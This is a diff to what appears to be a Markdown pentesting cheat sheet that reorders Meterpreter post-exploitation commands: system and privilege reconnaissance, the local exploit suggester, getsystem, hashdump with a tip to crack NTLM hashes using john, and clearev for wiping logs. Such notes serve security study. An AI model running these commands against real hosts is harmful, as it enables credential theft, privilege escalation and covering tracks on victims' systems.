@@ -184,17 +184,42 @@ meterpreter > exit
 And there are quite a lof of useful "post" modules
 
 ```bash
-meterpreter > shell # start a shell
-C:\WINDOWS\system32> whoami
-meterpreter > getsystem
 meterpreter > sysinfo
+# Use the build xxx to find exploits
+# Use the architecture to find if there are compatible...
+# ...
+# Computer        : XXX-PC
+# OS              : Windows X (... Build xxx...).
+# Architecture    : x64
+# System Language : en_US
+# Domain          : WORKGROUP
+# Logged On Users : 2
+# Meterpreter     : x86/windows
 meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM # means that you're an admin
+# NT... means that you're an admin
+# Server username: NT AUTHORITY\SYSTEM
+meterpreter > getprivs
+# see your privileges
+meterpreter > shell # start a shell
+# you can run commands
+# C:\WINDOWS\system32> whoami
+# C:\WINDOWS\system32> systeminfo
+meterpreter > run post/multi/recon/local_exploit_suggester
+# suggest exploits
+# this doesn't work well on x64
+```
+</div><div>
+
+Once you are admin
+
+```bash
+meterpreter > getsystem
 meterpreter > hashdump # dump usernames/password...
 # try to bruteforce NTML with john format=nt
 meterpreter > clearev # clean logs
 ```
-</div><div>
+
+Other commands
 
 ```bash
 meterpreter > idletime # time the host was idle
@@ -256,6 +281,7 @@ meterpreter > keyscan_dump # dump keys
 ```
 </details>
 
+Note: you can use `sessions sid` in the meterpreter, which is like `sessions -i sid` in the msfconsole.
 </div></div>
 
 <hr class="sr">
